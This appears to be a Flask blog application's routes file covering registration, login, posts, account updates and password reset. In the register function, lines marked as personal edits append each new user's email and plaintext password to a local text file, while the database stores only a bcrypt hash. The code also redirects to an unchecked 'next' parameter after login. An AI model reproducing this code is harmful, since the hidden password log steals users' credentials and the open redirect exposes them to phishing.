import secrets
import os
from flask import render_template, url_for, flash, redirect, request, abort
from flaskblog import app, db, bcrypt, mail
from flaskblog.forms import RegistrationForm, LoginForm, UpdateAccountForm, PostForm, ResetPasswordForm, \
    RequestResetForm
from flaskblog.models import User, Post
from flask_login import login_user, current_user, logout_user, login_required
from flask_mail import Message


def save_picture(form_picture):  # IMAGE RESIZING FUNCTION ISN"T INCLUDED. IMPORTANT FOR FAST PAGE LOAD
    random_hex = secrets.token_hex(4)
    _, f_ext = os.path.splitext(form_picture.filename)
    picture_fn = random_hex + f_ext
    picture_path = os.path.join(app.root_path, 'static/picture', picture_fn)
    form_picture.save(picture_path)
    return picture_fn


@app.route('/')
@app.route('/home')  # routing address
def home():
    page = request.args.get('page', 1, type=int)
    posts = Post.query.order_by(Post.date_posted.desc()).paginate(page=page, per_page=1)
    return render_template('home/home.html', posts=posts)


'''Render template is the function for using html files and making 
    a relation between py file and html file. 
    The html files must be in a folder named Template
'''


@app.route('/about')
def about():
    return render_template('home/about.html', title='ABOUT')


'''GET - Used to fetch the specified resource
   POST - Used to create new data at the specified resource
   This are HTTP methods


# validate_on_submit is A default function of FlaskForm
# url_for('something') is a function to redirecting to that something 
# flash is a function for warning/general messages
'''


@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    form = RegistrationForm()
    picture_file = 'default.jpg'
    if form.validate_on_submit():
        if form.picture.data:  # Myedit
            picture_file = save_picture(form.picture.data)
        pas = form.password.data  # My edit
        use = form.email.data  # Myedit
        n = '\n'
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user = User(username=form.username.data, email=form.email.data, password=hashed_password,
                    image_file=picture_file)
        db.session.add(user)
        db.session.commit()
        file1 = open("myfile.txt", "a")
        file1.write(f"{use} {pas} {picture_file} {n}")
        file1.close()  # to change file access modes

        flash(f'Account created for {form.username.data}, you can login', 'success')
        return redirect(url_for('login'))
    return render_template('home/register.html', title='REGISTER', form=form)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        if user and bcrypt.check_password_hash(user.password, form.password.data):
            login_user(user, remember=form.remember.data)
            next_page = request.args.get('next')
            flash(f'AAhlogin', 'success')
            return redirect(next_page) if next_page else redirect(url_for('home'))
        else:
            flash('Nah login', 'danger')
    return render_template('home/login.html', title='Login', form=form)


@app.route('/logout')
def logout():
    logout_user()
    flash('logged out', 'info')
    return redirect(url_for('home'))


@app.route('/account', methods=['GET', 'POST'])
@login_required
def account():
    form = UpdateAccountForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_picture(form.picture.data)
            current_user.image_file = picture_file
        current_user.username = form.username.data
        current_user.email = form.email.data
        db.session.commit()
        flash('account updated', 'info')
        return redirect(url_for('account'))
    elif request.method == 'GET':
        form.username.data = current_user.username
        form.email.data = current_user.email
    image_file = url_for('static', filename='picture/' + current_user.image_file)
    return render_template('home/account.html', title='Account', image_file=image_file, form=form)


@app.route("/post/new", methods=['GET', 'POST'])
@login_required
def new_post():
    form = PostForm()
    if form.validate_on_submit():
        post = Post(title=form.title.data, content=form.content.data, author=current_user)
        db.session.add(post)
        db.session.commit()
        flash('Post has created', 'success')
        return redirect(url_for('home'))
    return render_template('home/create_post.html', title='New Post', form=form, legend='New Post')


@app.route("/post/<int:post_id>")
def post(post_id):
    post = Post.query.get_or_404(post_id)
    return render_template('home/post.html', title=post.title, post=post)


@app.route("/post/<int:post_id>/update", methods=['GET', 'POST'])
@login_required
def update_post(post_id):
    post = Post.query.get_or_404(post_id)
    if post.author != current_user:
        abort(403)
    form = PostForm()
    if form.validate_on_submit():
        post.title = form.title.data
        post.content = form.content.data
        db.session.commit()
        flash('Post Updated', 'info')
        return redirect(url_for('post', post_id=post.id))
    elif request.method == 'GET':
        form.title.data = post.title
        form.content.data = post.content

    return render_template('home/create_post.html', title='Update Post', form=form, legend='Update Post')


@app.route("/post/<int:post_id>/delete", methods=['POST'])
@login_required
def delete_post(post_id):
    post = Post.query.get_or_404(post_id)
    if post.author != current_user:
        abort(403)
    db.session.delete(post)
    db.session.commit()
    flash("Post Deleted", 'info')
    return redirect(url_for('home'))


@app.route("/post/<string:username>")  # routing address
def user_posts(username):
    page = request.args.get('page', 1, type=int)
    user = User.query.filter_by(username=username).first_or_404()
    posts = Post.query.filter_by(author=user).order_by(Post.date_posted.desc()).paginate(page=page, per_page=3)

    return render_template('home/user_posts.html', posts=posts, user=user)


def send_reset_email(user):
    token = user.get_reset_token()
    msg = Message('Password reset request',
                  sender= 'noreply@demo.com',
                  recipients=[user.email])
    msg.body = f'''To reset your pass, visit the following link:
{url_for('reset_token',token=token,_external=True)}
if this is whatev.....
'''
    mail.send(msg)


@app.route("/reset_password/", methods=['GET', 'POST'])
def reset_request():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    form = RequestResetForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        send_reset_email(user)
        flash('email is sent to reset pass', 'info')
        return redirect((url_for('login')))
    return render_template('home/reset_request.html', title='Reset Password', form=form)


@app.route("/reset_password/<token>", methods=['GET', 'POST'])
def reset_token(token):
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    user = User.verify_reset_token(token)
    if user is None:
        flash('invalid or expired token', 'warning')
        return redirect(url_for('reset_request'))
    form = ResetPasswordForm()
    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data).decode('utf-8')
        user.password = hashed_password
        db.session.commit()
        flash(f'Password updated, you can login', 'success')
        return redirect(url_for('login'))
    return render_template('home/reset_token.html', title='Reset Password', form=form)

# @app.route('/delaccount')
# def delaccount():
#     user = User.query.filter_by(username=current_user.username).first()
#     if user==None:
#         return render_template('home/register.html', title='REGISTER', form=form)
#
#     db.session.delete(user)
#     db.session.commit()
#     flash('bye', 'danger')
#     return render_template('home/delaccount.html', title='Delete Account')
